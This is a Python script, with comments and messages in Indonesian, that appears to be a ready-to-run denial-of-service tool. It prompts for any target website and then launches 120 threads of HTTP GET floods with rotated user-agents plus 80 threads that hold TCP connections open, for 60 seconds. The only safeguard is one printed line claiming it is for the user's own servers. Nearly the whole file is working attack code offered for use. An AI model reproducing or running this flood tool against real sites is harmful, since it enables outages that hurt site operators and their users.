#!/usr/bin/env python3
import socket
import threading
import time
import random
import sys
from urllib.parse import urlparse

# Daftar User-Agent realistis
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"
]

def resolve_ip(host):
    try:
        return socket.gethostbyname(host)
    except:
        print("❌ Gagal resolve domain!")
        sys.exit(1)

def http_flood(host, port, path, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UAS)}\r\n"
                f"Accept: text/html,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            s.send(req.encode())
            # JANGAN TUTUP → tahan sebentar biar beban naik
            time.sleep(0.5)
            s.close()
        except:
            pass

def tcp_hold(host, port, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            # Tahan koneksi tanpa kirim data
            time.sleep(random.uniform(5, 12))
            s.close()
        except:
            pass

def main():
    print("Haloo Rapipp")
    print("=" * 40)
    url = input(" target website: ").strip()

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    parsed = urlparse(url)
    host = parsed.hostname
    port = 443 if parsed.scheme == "https" else 80
    path = parsed.path or "/"

    if not host:
        print("❌ URL tidak valid!")
        return

    ip = resolve_ip(host)
    print(f"\n🎯 Target: {url}")
    print(f"🌐 Resolved IP: {ip}")
    print(f"⚡ Mode: HTTP Flood + TCP Hold")
    print(f"🧶 Thread: 200 | Auto-loop selama 60 detik")
    print(f"\n⚠️  HANYA UNTUK SERVER YANG KAMU MILIKI!\n")
    time.sleep(3)

    # Jalankan 120 thread HTTP flood + 80 thread TCP hold
    threads = []
    for _ in range(120):
        t = threading.Thread(target=http_flood, args=(ip, port, path, 60))
        t.daemon = True
        threads.append(t)
        t.start()

    for _ in range(80):
        t = threading.Thread(target=tcp_hold, args=(ip, port, 60))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        print("💥 GEBUG DIMULAI — Tahan 60 detik...")
        time.sleep(60)
        print("\n✅ Selesai.")
    except KeyboardInterrupt:
        print("\n🛑 Dihentikan.")

if __name__ == "__main__":
    main()
